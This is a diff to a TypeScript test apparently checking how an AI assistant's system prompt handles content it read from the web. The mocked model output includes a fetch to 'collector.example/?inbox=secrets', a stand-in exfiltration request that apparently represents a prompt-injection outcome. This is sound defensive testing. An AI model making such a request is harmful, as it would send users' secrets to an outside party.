@@ -46,7 +46,9 @@ describe("a conversation that read outside content", () => {
     let outputs: string[] = [];
     h.brain.next((req, out) => {
       outputs = out;
-      expect(req.system).toContain(UNTRUSTED_NOTE);
+      // Careful about what it read, without taking your own message for outside content.
+      expect(req.system).toContain("Earlier in this conversation you read a web page.");
+      expect(req.system).not.toContain(UNTRUSTED_NOTE);
       return [
         { fetch: "https://news.example/more", content: "the rest" },
         { fetch: "https://collector.example/?inbox=secrets", content: "never" },
